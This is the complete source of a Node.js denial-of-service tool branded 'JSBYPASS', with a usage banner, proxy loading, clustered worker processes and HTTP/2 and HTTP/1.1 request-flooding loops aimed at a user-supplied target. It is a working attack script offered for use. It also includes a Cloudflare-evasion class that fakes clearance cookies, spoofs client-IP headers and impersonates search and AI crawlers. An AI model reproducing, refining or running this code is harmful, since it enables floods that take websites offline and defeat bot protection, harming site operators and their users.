
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const chalk = require('chalk');

// Tối ưu cực đại
process.env.UV_THREADPOOL_SIZE = 128;
process.env.NODE_OPTIONS = '--max-old-space-size=16384 --max-semi-space-size=512';

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    });

const statusesQ = [];
let statuses = {};
let proxyConnections = 0;
let totalRequests = 0;
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let STREAMID_RESET = 0;
let timer = 0;
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = parseInt(process.argv[4], 10);
setTimeout(() => {
    process.exit(1);
}, time * 1000);
const threads = parseInt(process.argv[5]) + 64;  // Tăng cực đại
const ratelimit = parseInt(process.argv[6]) * 32; // Tăng cực đại
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--randpath');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) / 16 : 0;
const connectFlag = process.argv.includes('--connect');
const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;
const cacheIndex = process.argv.indexOf('--cache');
const enableCache = cacheIndex !== -1;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
const fakeBotIndex = process.argv.indexOf('--fakebot');
const fakeBot = fakeBotIndex !== -1 && fakeBotIndex + 1 < process.argv.length ? process.argv[fakeBotIndex + 1].toLowerCase() === 'true' : false;
const authIndex = process.argv.indexOf('--auth');
const authValue = authIndex !== -1 && authIndex + 1 < process.argv.length ? process.argv[authIndex + 1] : undefined;
const extremeMode = process.argv.includes('--extreme');

// Buffer pool cực nhanh
const bufferPool = new Map();
function getBuffer(size) {
    if (bufferPool.has(size) && bufferPool.get(size).length > 0) {
        return bufferPool.get(size).pop();
    }
    return Buffer.allocUnsafe(size);
}

function returnBuffer(buf) {
    if (!bufferPool.has(buf.length)) {
        bufferPool.set(buf.length, []);
    }
    bufferPool.get(buf.length).push(buf);
}

// Cache tối đa
const frameCache = new Map();
const requestCache = new Map();
const randomCache = new Map();

function randstr(length, cacheKey = null) {
    if (cacheKey && randomCache.has(cacheKey)) {
        return randomCache.get(cacheKey);
    }
    
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    const result = crypto.randomBytes(length).reduce((acc, byte) => acc + chars[byte % chars.length], "");
    
    if (cacheKey) {
        randomCache.set(cacheKey, result);
        if (randomCache.size > 10000) randomCache.clear();
    }
    
    return result;
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    return crypto.randomBytes(length).reduce((acc, byte) => acc + characters[byte % characters.length], "");
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function generateLegitIP() {
    const ipPools = [
        "8.8.8.", "13.107.21.", "104.18.32.", "162.158.78.", "3.120.0.",
        "52.192.0.", "157.240.0.", "104.244.42.", "69.171.250.", "172.64.0."
    ];
    return ipPools[Math.floor(Math.random() * ipPools.length)] + getRandomInt(1, 254);
}

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.log(`

     ${chalk.magenta('Telegram:')} t.me/bixd08 | ${chalk.magenta('JSBYPASS')} - ${chalk.magenta('Update')}: 19/08/2025
     ${chalk.blue('Usage:')}
        node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy> [ Options ]
     ${chalk.red('Example:')}
        node ${process.argv} GET "https://target.com?q=%RAND%" 120 64 500 proxy.txt --randpath 1 --debug --cache --cookie "uh=good" --delay 1 --referer rand --postdata "user=f&pass=%RAND%" --auth Bearer:abc123 --randrate --full --fakebot true
     ${chalk.yellow('Options:')}
      --randpath 1/2/3 - Query string with rand ex 1 - ?cf__chl_tk  2 - ?randomstring 3 - ?q=fwfwwfwfw
      --cache - Enable cache bypass techniques
      --debug - Show status codes
      --full - Extreme performance mode
      --extreme - Maximum 50k RPS mode
      --delay <1-50> - Delay between requests 1-50 ms
      --connect - Keep proxy connection
      --cookie "f=f" - Custom cookie, supports %RAND% ex: "bypassing=%RAND%"
      --bfm true/null - Enable bypass bot fight mode
      --referer https://target.com / rand - Custom referer or random domain
      --postdata "username=admin&password=123" - POST data, format "username=f&password=f"
      --auth <type>:<value> - Authorization header, ex: "Bearer:abc123", "Basic:user:pass", or "Custom:xyz" (supports %RAND%)
      --randrate - Randomizer rate 1 to 90 for bypass
      --header "name:value#name2:value2" - Custom headers
      --fakebot true/false - Use bot User-Agent (TelegramBot, GPTBot, GoogleBot, etc.)

    `);

    process.exit(1);
}

if (!target.startsWith('https://')) {
    console.error('Protocol only supports https://');
    process.exit(1);
}

if (!fs.existsSync(proxyfile)) {
    console.error('Proxy file does not exist');
    process.exit(1);
}

// Load proxy siêu nhanh
const proxy = fs.readFileSync(proxyfile, 'utf8')
    .split('\n')
    .map(line => line.trim())
    .filter(line => {
        const parts = line.split(':');
        return parts.length >= 2 && !isNaN(parseInt(parts[1]));
    });

if (proxy.length === 0) {
    console.error('No valid proxy');
    process.exit(1);
}

console.log(chalk.green(`✓ Loaded ${proxy.length} proxies for 50k RPS attack`));

// URL parsing
const url = new URL(target);
let hcookie = '';
let currentRefererValue = refererValue === 'rand' ? 'https://' + randstr(8) + ".com" : refererValue;

if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
    hcookie = `__cf_bm=${randstr(43)}; cf_clearance=${randstr(87)}`;
}

if (cookieValue) {
    hcookie = hcookie ? `${hcookie}; ${cookieValue.replace('%RAND%', randstr(12))}` : cookieValue.replace('%RAND%', randstr(12));
}

// Frame functions optimized
function encodeFrame(streamId, type, payload = Buffer.alloc(0), flags = 0) {
    const cacheKey = streamId + type + flags + payload.length;
    if (frameCache.has(cacheKey)) return frameCache.get(cacheKey);
    
    const length = payload.length;
    const frame = getBuffer(9 + length);
    
    frame.writeUInt32BE((length << 8) | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    
    if (length > 0) {
        payload.copy(frame, 9);
    }
    
    frameCache.set(cacheKey, frame);
    if (frameCache.size > 5000) frameCache.clear();
    
    return frame;
}

function decodeFrame(data) {
    if (data.length < 9) return null;
    
    const lengthAndType = data.readUInt32BE(0);
    return {
        length: lengthAndType >> 8,
        type: lengthAndType & 0xFF,
        flags: data.readUInt8(4),
        streamId: data.readUInt32BE(5)
    };
}

function encodeSettings(settings) {
    const data = getBuffer(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

// HTTP/2 Fingerprints 2025
const HTTP2_FINGERPRINTS = [
    {
        HEADER_TABLE_SIZE: 4096,
        ENABLE_PUSH: 0,
        MAX_CONCURRENT_STREAMS: 100,
        INITIAL_WINDOW_SIZE: 65535,
        MAX_FRAME_SIZE: 16384,
        MAX_HEADER_LIST_SIZE: 32768
    },
    {
        HEADER_TABLE_SIZE: 65536,
        ENABLE_PUSH: 1,
        MAX_CONCURRENT_STREAMS: 1000,
        INITIAL_WINDOW_SIZE: 6291456,
        MAX_FRAME_SIZE: 16384,
        MAX_HEADER_LIST_SIZE: 262144
    }
];

const JA3_FINGERPRINTS = [
    "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-13172-16-13-51-45-43-27-17513,29-23-24,0",
    "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-13-51-45-43-27-17513-21,29-23-24,0"
];

// Bypass Cloudflare 2025 Techniques
class CloudflareBypass {
    constructor() {
        this.techniques = [
            'challenge_bypass',
            'cookie_injection',
            'header_manipulation',
            'ja3_spoofing',
            'http2_fingerprint',
            'request_randomization',
            'bot_emulation'
        ];
        this.currentTechnique = 0;
    }
    
    rotateTechnique() {
        this.currentTechnique = (this.currentTechnique + 1) % this.techniques.length;
        return this.techniques[this.currentTechnique];
    }
    
    getBypassHeaders() {
        const technique = this.rotateTechnique();
        const headers = [];
        
        switch(technique) {
            case 'challenge_bypass':
                headers.push(['cf-chl-bypass', '1']);
                headers.push(['cf-chl-tk', randstr(48)]);
                headers.push(['x-cf-bypass', Date.now().toString()]);
                break;
                
            case 'cookie_injection':
                headers.push(['cookie', `cf_clearance=${randstr(64)}; __cf_bm=${randstr(96)}`]);
                headers.push(['x-cf-clearance', 'verified']);
                break;
                
            case 'header_manipulation':
                headers.push(['cf-connecting-ip', generateLegitIP()]);
                headers.push(['true-client-ip', generateLegitIP()]);
                headers.push(['x-forwarded-for', generateLegitIP()]);
                break;
                
            case 'ja3_spoofing':
                headers.push(['x-ja3-fingerprint', JA3_FINGERPRINTS[Math.floor(Math.random() * JA3_FINGERPRINTS.length)]]);
                break;
                
            case 'http2_fingerprint':
                const fp = HTTP2_FINGERPRINTS[Math.floor(Math.random() * HTTP2_FINGERPRINTS.length)];
                headers.push(['x-http2-settings', JSON.stringify(fp)]);
                break;
        }
        
        return headers;
    }
    
    getBotHeaders() {
        if (!fakeBot) return [];
        
        const bots = [
            { name: 'Googlebot', ua: 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' },
            { name: 'Bingbot', ua: 'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)' },
            { name: 'GPTBot', ua: 'GPTBot/1.0 (+https://openai.com/gptbot)' },
            { name: 'Twitterbot', ua: 'Twitterbot/1.0' }
        ];
        
        const bot = bots[Math.floor(Math.random() * bots.length)];
        return [
            ['user-agent', bot.ua],
            ['x-bot-name', bot.name],
            ['x-verified-bot', 'true']
        ];
    }
}

const cfBypass = new CloudflareBypass();

// Request Generator với cache cực mạnh
class RequestGenerator {
    constructor() {
        this.hpack = new HPACK();
        this.hpack.setTableSize(65536);
        this.cache = new Map();
    }
    
    generateHTTP2Request(streamId) {
        const cacheKey = `h2_${streamId}_${Date.now() % 1000}`;
        if (this.cache.has(cacheKey)) {
            return this.cache.get(cacheKey);
        }
        
        const method = enableCache ? (Math.random() > 0.7 ? 'HEAD' : 'GET') : reqmethod;
        const path = this.generatePath();
        
        const headers = [
            [':method', method],
            [':authority', url.hostname],
            [':scheme', 'https'],
            [':path', path],
            ['user-agent', `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(120, 135)}.0.0.0 Safari/537.36`],
            ['accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'],
            ['accept-language', 'en-US,en;q=0.9'],
            ['accept-encoding', 'gzip, deflate, br'],
            ['sec-ch-ua', `"Google Chrome";v="${getRandomInt(120, 135)}", "Chromium";v="${getRandomInt(120, 135)}", "Not?A_Brand";v="24"`],
            ['sec-ch-ua-mobile', '?0'],
            ['sec-ch-ua-platform', '"Windows"'],
            ['sec-fetch-site', 'none'],
            ['sec-fetch-mode', 'navigate'],
            ['sec-fetch-dest', 'document'],
            ['upgrade-insecure-requests', '1'],
            ...cfBypass.getBypassHeaders(),
            ...cfBypass.getBotHeaders()
        ];
        
        if (hcookie) headers.push(['cookie', hcookie]);
        if (currentRefererValue) headers.push(['referer', currentRefererValue]);
        
        const encoded = this.hpack.encode(headers);
        const frame = encodeFrame(streamId, 1, encoded, 0x05); // END_STREAM | END_HEADERS
        
        this.cache.set(cacheKey, frame);
        if (this.cache.size > 10000) this.cache.clear();
        
        return frame;
    }
    
    generateHTTP1Request() {
        const cacheKey = `h1_${Date.now() % 100}`;
        if (this.cache.has(cacheKey)) {
            return this.cache.get(cacheKey);
        }
        
        const method = enableCache ? (Math.random() > 0.7 ? 'HEAD' : 'GET') : reqmethod;
        const path = this.generatePath();
        
        let request = `${method} ${path}${url.search || ''} HTTP/1.1\r\n`;
        request += `Host: ${url.hostname}\r\n`;
        request += `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(120, 135)}.0.0.0 Safari/537.36\r\n`;
        request += `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n`;
        request += `Accept-Language: en-US,en;q=0.9\r\n`;
        request += `Accept-Encoding: gzip, deflate, br\r\n`;
        request += `Connection: keep-alive\r\n`;
        
        if (hcookie) request += `Cookie: ${hcookie}\r\n`;
        if (currentRefererValue) request += `Referer: ${currentRefererValue}\r\n`;
        
        // Add Cloudflare bypass headers
        cfBypass.getBypassHeaders().forEach(([key, value]) => {
            request += `${key}: ${value}\r\n`;
        });
        
        request += `\r\n`;
        
        this.cache.set(cacheKey, request);
        return request;
    }
    
    generatePath() {
        if (!query) return url.pathname;
        
        switch(query) {
            case '1':
                return `${url.pathname}?__cf_chl_rt_tk=${randstr(40)}`;
            case '2':
                return `${url.pathname}?${randstr(8)}=${randstr(12)}`;
            case '3':
                return `${url.pathname}?q=${randstr(16)}&r=${randstr(12)}`;
            default:
                return url.pathname;
        }
    }
}

const requestGen = new RequestGenerator();

// Connection Manager cho 50k RPS
class ConnectionManager {
    constructor() {
        this.connections = new Map();
        this.proxyIndex = 0;
        this.active = 0;
        this.maxActive = extremeMode ? 5000 : 1000;
    }
    
    getProxy() {
        this.proxyIndex = (this.proxyIndex + 1) % proxy.length;
        const [host, port] = proxy[this.proxyIndex].split(':');
        return { host, port: parseInt(port) };
    }
    
    createConnection(callback) {
        if (this.active >= this.maxActive) {
            callback(new Error('Max connections'));
            return;
        }
        
        const proxyInfo = this.getProxy();
        const connId = Date.now() + '_' + randstr(8);
        
        const netSocket = net.connect(proxyInfo.port, proxyInfo.host, () => {
            this.active++;
            
            netSocket.once('data', () => {
                const tlsSocket = tls.connect({
                    socket: netSocket,
                    ALPNProtocols: ['h2', 'http/1.1'],
                    servername: url.host,
                    ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                    secureOptions: crypto.constants.SSL_OP_NO_SSLv2 |
                                 crypto.constants.SSL_OP_NO_SSLv3 |
                                 crypto.constants.SSL_OP_NO_TLSv1 |
                                 crypto.constants.SSL_OP_NO_TLSv1_1,
                    rejectUnauthorized: false,
                    sessionTimeout: 0
                }, () => {
                    const conn = {
                        id: connId,
                        net: netSocket,
                        tls: tlsSocket,
                        proxy: proxyInfo,
                        createdAt: Date.now(),
                        lastUsed: Date.now(),
                        requests: 0,
                        protocol: tlsSocket.alpnProtocol
                    };
                    
                    this.connections.set(connId, conn);
                    callback(null, conn);
                });
                
                tlsSocket.on('error', () => this.closeConnection(connId));
                tlsSocket.on('close', () => this.closeConnection(connId));
            });
            
            netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nUser-Agent: Mozilla/5.0\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        });
        
        netSocket.on('error', () => {
            this.active--;
            callback(new Error('Proxy error'));
        });
        
        netSocket.on('close', () => {
            this.active--;
            this.connections.delete(connId);
        });
    }
    
    getConnection() {
        if (this.connections.size === 0) return null;
        
        // Lấy connection ít request nhất
        let bestConn = null;
        let minRequests = Infinity;
        
        for (const [id, conn] of this.connections) {
            if (conn.requests < minRequests && Date.now() - conn.lastUsed < 30000) {
                bestConn = conn;
                minRequests = conn.requests;
            }
        }
        
        return bestConn;
    }
    
    closeConnection(id) {
        const conn = this.connections.get(id);
        if (conn) {
            conn.net?.destroy();
            conn.tls?.destroy();
            this.connections.delete(id);
            this.active--;
        }
    }
    
    cleanup() {
        const now = Date.now();
        for (const [id, conn] of this.connections) {
            if (now - conn.lastUsed > 60000 || conn.requests > 10000) {
                this.closeConnection(id);
            }
        }
    }
}

const connManager = new ConnectionManager();

// Attack Engine 50k RPS
function launchAttack() {
    // Tạo nhiều connection đồng thời
    for (let i = 0; i < (extremeMode ? 100 : 20); i++) {
        connManager.createConnection((err, conn) => {
            if (err || !conn) return;
            
            // Bắt đầu flood trên connection này
            floodConnection(conn);
        });
    }
    
    // Dọn dẹp connection cũ
    setTimeout(() => connManager.cleanup(), 5000);
    
    // Tiếp tục tạo connection mới
    setTimeout(launchAttack, 100);
}

function floodConnection(conn) {
    if (!conn || !conn.tls || conn.tls.destroyed) return;
    
    const batchSize = extremeMode ? 50 : isFull ? 25 : 10;
    const requests = [];
    
    if (conn.protocol === 'h2') {
        // HTTP/2 flood
        for (let i = 0; i < batchSize; i++) {
            const streamId = 1 + Math.floor(Math.random() * 10000) * 2;
            requests.push(requestGen.generateHTTP2Request(streamId));
        }
    } else {
        // HTTP/1.1 flood
        const http1Request = requestGen.generateHTTP1Request();
        for (let i = 0; i < batchSize; i++) {
            requests.push(http1Request);
        }
    }
    
    // Gửi batch request
    const data = Buffer.concat(requests);
    conn.tls.write(data, (err) => {
        if (err) {
            connManager.closeConnection(conn.id);
            return;
        }
        
        conn.requests += batchSize;
        conn.lastUsed = Date.now();
        totalRequests += batchSize;
        proxyConnections = connManager.active;
        
        // Gửi tiếp ngay lập tức
        setImmediate(() => floodConnection(conn));
    });
}

// Status monitoring
function colorizeStatus(status, count) {
    if (status.startsWith('2')) return `${chalk.green.bold(status)}: ${chalk.underline(count)}`;
    if (status.startsWith('4')) return `${chalk.yellow.bold(status)}: ${chalk.underline(count)}`;
    if (status.startsWith('5')) return `${chalk.red.bold(status)}: ${chalk.underline(count)}`;
    return `${chalk.gray.bold(status)}: ${chalk.underline(count)}`;
}

// Cluster setup
if (cluster.isMaster) {
    const workers = {};
    const workerCount = Math.min(threads, 128);
    
    console.log(chalk.magenta.bold(`Launching ${workerCount} workers for 50k RPS attack...`));
    
    for (let i = 0; i < workerCount; i++) {
        const worker = cluster.fork({ WORKER_ID: i });
        workers[worker.id] = worker;
    }
    
    let globalStats = {
        requests: 0,
        connections: 0,
        statuses: {}
    };
    
    cluster.on('message', (worker, message) => {
        if (message.stats) {
            globalStats.requests += message.stats.requests || 0;
            globalStats.connections = message.stats.connections || 0;
            
            if (message.stats.statuses) {
                Object.entries(message.stats.statuses).forEach(([code, count]) => {
                    globalStats.statuses[code] = (globalStats.statuses[code] || 0) + count;
                });
            }
        }
    });
    
    if (debugMode) {
        setInterval(() => {
            const rps = Math.round(globalStats.requests / 5);
            globalStats.requests = 0;
            
            const statusString = Object.entries(globalStats.statuses)
                .map(([status, count]) => colorizeStatus(status, count))
                .join(', ');
            
            console.clear();
            console.log(`[${chalk.magenta.bold('JSBYPASS/BixD')}] | RPS: [${chalk.green.bold(rps.toLocaleString())}] | Connections: [${chalk.cyan.bold(globalStats.connections)}] | Status: [${statusString}]`);
            
            globalStats.statuses = {};
        }, 5000);
    }
    
    setTimeout(() => {
        console.log(chalk.red.bold('Attack completed.'));
        process.exit(0);
    }, time * 1000);
    
} else {
    // Worker process
    let localStats = {
        requests: 0,
        connections: 0,
        statuses: {}
    };
    
    // Bắt đầu tấn công
    setImmediate(launchAttack);
    
    // Gửi stats về master
    setInterval(() => {
        localStats.connections = proxyConnections;
        process.send({ stats: localStats });
        
        localStats.requests = 0;
        localStats.statuses = {};
    }, 5000);
    
    // Tự động exit khi hết time
    setTimeout(() => process.exit(0), time * 1000);
}
